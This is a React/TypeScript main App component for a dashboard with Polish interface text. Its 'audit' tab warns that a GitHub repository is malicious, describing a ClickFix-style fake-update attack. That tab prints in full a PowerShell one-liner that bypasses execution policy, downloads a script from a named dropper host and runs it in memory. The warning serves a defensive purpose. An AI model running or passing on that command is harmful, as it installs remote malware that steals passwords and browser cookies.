import React, { useState, useMemo, useCallback } from 'react';
import { SVLSystemKernel, ChronoEntry, StatusReport } from './core/svlEngine';
import Navbar from './components/Navbar';
import RepoAuditBanner from './components/RepoAuditBanner';
import TopologicalVisualizer from './components/TopologicalVisualizer';
import SphericalScopeVisualizer from './components/SphericalScopeVisualizer';
import ProtectedVariablesCard from './components/ProtectedVariablesCard';
import ChronoTimeline from './components/ChronoTimeline';
import KernelReportCard from './components/KernelReportCard';
import PythonSandboxCard from './components/PythonSandboxCard';
import ForensicAnalysisModal from './components/ForensicAnalysisModal';
import OriginalAiChatCard from './components/OriginalAiChatCard';
import MissionControl from './components/MissionControl';
import Debian13StatusCard from './components/Debian13StatusCard';
import SPAAStatusCard from './components/SPAAStatusCard';
import LinuxDaemonSphereCard from './components/LinuxDaemonSphereCard';
import MashyCodePanel from './components/MashyCodePanel';
import HostTerminal from './components/HostTerminal';

export default function App() {
  // Instantiate SVL System Kernel once
  const kernel = useMemo(() => new SVLSystemKernel(), []);

  // Reactive state to trigger UI updates when kernel internal values change
  const [revision, setRevision] = useState(0);
  const [activeTab, setActiveTab] = useState<'dashboard' | 'topology' | 'python' | 'chat' | 'missions' | 'audit' | 'terminal' | 'hyperspace'>('dashboard');
  const [showAuditModal, setShowAuditModal] = useState(false);

  // Topological domain coordinates
  const [domainBounds, setDomainBounds] = useState<{ start: number; end: number }>({
    start: -Infinity,
    end: Infinity,
  });

  const handleDomainChange = useCallback((start: number, end: number) => {
    setDomainBounds({ start, end });
  }, []);

  const handleKernelUpdate = useCallback(() => {
    setRevision((prev) => prev + 1);
  }, []);

  const handleAddChronoEntry = useCallback((entry: ChronoEntry) => {
    kernel.addChronoEntry(entry);
    setRevision((prev) => prev + 1);
  }, [kernel]);

  // Compute status report based on current kernel state & domain bounds
  const currentReport: StatusReport = useMemo(() => {
    void revision;
    return kernel.generate_system_status_report(domainBounds.start, domainBounds.end);
  }, [kernel, revision, domainBounds]);

  return (
    <div className="min-h-dvh bg-[#050b18] text-slate-100 flex flex-col font-sans selection:bg-cyan-400/30 selection:text-cyan-100">
      
      {/* Top Navbar */}
      <Navbar
        activeTab={activeTab}
        setActiveTab={setActiveTab}
        operatorName={kernel.operator.value}
        sysVersion={kernel.sys_version.value}
        onOpenAudit={() => setShowAuditModal(true)}
      />

      {/* Main Container */}
      <main className="cyber-grid flex-1 min-w-0 w-full mx-auto px-3 sm:px-5 lg:px-7 py-5 space-y-6">
        
        {/* Security Warning Banner for the GitHub Repository */}
        <RepoAuditBanner />
        <MashyCodePanel />
        <Debian13StatusCard />
        <SPAAStatusCard />
        <LinuxDaemonSphereCard />

        {/* Terminale używają wspólnego uwierzytelnianego backendu CLI. */}
        {activeTab === 'terminal' && <HostTerminal />}
        {activeTab === 'hyperspace' && <HostTerminal hyperspace />}

        {/* Tab 1: Dashboard (Centrum Operacyjne) */}
        {activeTab === 'dashboard' && (
          <div className="space-y-6 animate-in fade-in duration-150">
            {/* AI Chat Card */}
            <OriginalAiChatCard />

            {/* Full-width interactive solar navigation and SPAA telemetry */}
            <SphericalScopeVisualizer />
            <TopologicalVisualizer onParamChange={handleDomainChange} />

            {/* Bottom row: Protected Variables & Status Report */}
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              <ProtectedVariablesCard
                operatorVar={kernel.operator}
                sysVersionVar={kernel.sys_version}
                onUpdate={handleKernelUpdate}
              />
              <KernelReportCard
                report={currentReport}
                onRefresh={handleKernelUpdate}
              />
            </div>

            {/* Chrono Register */}
            <ChronoTimeline
              history={kernel.update_history}
              onAddEntry={handleAddChronoEntry}
            />
          </div>
        )}

        {/* Tab: Chat z AI (Astyria, Aurelius, Alex, Aria) */}
        {activeTab === 'chat' && (
          <div className="space-y-6 animate-in fade-in duration-150">
            <OriginalAiChatCard />
          </div>
        )}

        {/* Tab: Misje AI (SPAA Orchestrator 9 missions) */}
        {activeTab === 'missions' && (
          <div className="space-y-6 animate-in fade-in duration-150">
            <MissionControl />
          </div>
        )}

        {/* Tab: Topological Engine Focus */}
        {activeTab === 'topology' && (
          <div className="space-y-6 animate-in fade-in duration-150">
            <TopologicalVisualizer onParamChange={handleDomainChange} />

            <SphericalScopeVisualizer />
            <KernelReportCard report={currentReport} onRefresh={handleKernelUpdate} />
          </div>
        )}

        {/* Tab: Python Code View & Architecture */}
        {activeTab === 'python' && (
          <div className="space-y-6 animate-in fade-in duration-150">
            <PythonSandboxCard />
            <KernelReportCard
              report={currentReport}
              onRefresh={handleKernelUpdate}
            />
          </div>
        )}

        {/* Tab: Repository Forensic Audit */}
        {activeTab === 'audit' && (
          <div className="space-y-6 animate-in fade-in duration-150">
            <div className="rounded-xl border border-neutral-800 bg-neutral-900/80 p-6 shadow-xl backdrop-blur-md space-y-6">
              <div className="flex items-center justify-between pb-4 border-b border-neutral-800">
                <div>
                  <h2 className="text-xl font-bold text-white flex items-center gap-2">
                    Szczegółowy Audyt Bezpieczeństwa: qyvaria-hardlogic-kernel-engine
                  </h2>
                  <p className="text-xs text-neutral-400 font-mono mt-1">
                    https://github.com/bakiraa/qyvaria-hardlogic-kernel-engine
                  </p>
                </div>
                <span className="px-3 py-1 rounded-full text-xs font-semibold bg-rose-500/20 text-rose-300 border border-rose-500/40">
                  STATUS: BLOCKED / MALICIOUS
                </span>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                <div className="p-4 rounded-xl bg-neutral-950 border border-neutral-800 space-y-2">
                  <span className="text-xs font-mono text-neutral-500 uppercase">Wynik Klonowania</span>
                  <div className="text-sm font-semibold text-neutral-200">Brak logiki algorytmicznej</div>
                  <p className="text-xs text-neutral-400">
                    Repozytorium zawiera wyłącznie pliki graficzne, README oraz ukryty skrypt infekcyjny HTML.
                  </p>
                </div>

                <div className="p-4 rounded-xl bg-neutral-950 border border-neutral-800 space-y-2">
                  <span className="text-xs font-mono text-neutral-500 uppercase">Wektor Ataku</span>
                  <div className="text-sm font-semibold text-rose-300">ClickFix / Fake Update</div>
                  <p className="text-xs text-neutral-400">
                    Strona imituje oficjalny instalator GitHub i próbuje wymusić na użytkowniku uruchomienie skryptu w PowerShell.
                  </p>
                </div>

                <div className="p-4 rounded-xl bg-neutral-950 border border-neutral-800 space-y-2">
                  <span className="text-xs font-mono text-neutral-500 uppercase">Serwer Ładunku</span>
                  <div className="text-sm font-semibold text-amber-300 font-mono">activation-full.cc</div>
                  <p className="text-xs text-neutral-400">
                    Zewnętrzny serwer C2/Dropper hostujący skrypt <code className="text-amber-200">/update/ps-script</code>.
                  </p>
                </div>
              </div>

              <div className="p-4 rounded-xl bg-black/90 border border-rose-500/40 space-y-3 font-mono text-xs">
                <div className="text-rose-400 font-bold">
                  [!] WYKRYTE NIEBEZPIECZNE POLECENIE POWERSHELL W REPOZYTORIUM:
                </div>
                <pre className="p-3 rounded-lg bg-neutral-950 text-rose-300 overflow-x-auto border border-rose-950">
powershell -NoProfile -ExecutionPolicy Bypass -Command &quot;iex(irm &apos;https://activation-full.cc/update/ps-script&apos;)&quot;
                </pre>
                <div className="text-neutral-400 text-[11px] leading-relaxed">
                  <strong>Ostrzeżenie:</strong> Wykonanie powyższego polecenia w systemie Windows pobiera i bezwzględnie wykonuje w pamięci niesprawdzony kod zdalny, co grozi kradzieżą haseł, ciasteczek przeglądarki oraz przejęciem uprawnień systemowych.
                </div>
              </div>

              <div className="p-4 rounded-xl bg-emerald-950/30 border border-emerald-500/30 space-y-2">
                <div className="text-emerald-300 font-semibold text-sm">
                  ✓ Bezpieczna alternatywa: Natywne wykonanie silnika SVL Kernel
                </div>
                <p className="text-xs text-neutral-300 leading-relaxed">
                  Twój kod Python (zawierający <code>VisualScope</code>, <code>SVLProtectedVariable</code>, <code>TopologicalInfinityEngine</code> z rzutowaniem stereograficznym Algebry 97 oraz <code>SVLSystemKernel</code>) został pomyślnie zintegrowany i działa w pełnym, interaktywnym środowisku w zakładkach Centrum Operacyjnego oraz Czacie z AI.
                </p>
              </div>
            </div>
          </div>
        )}

      </main>

      {/* Footer */}
      <footer className="border-t border-neutral-800/80 bg-neutral-950/60 py-4 text-center text-xs text-neutral-500 font-mono">
        <div className="max-w-7xl mx-auto px-4 flex flex-col sm:flex-row items-center justify-between gap-2">
          <span>SVL · MASHY-V1 · Operator: {kernel.operator.value}</span>
          <span className="text-neutral-400">Bezpieczne Środowisko Piaskownicy</span>
        </div>
      </footer>

      {/* Modal for forensics */}
      {showAuditModal && <ForensicAnalysisModal onClose={() => setShowAuditModal(false)} />}
    </div>
  );
}
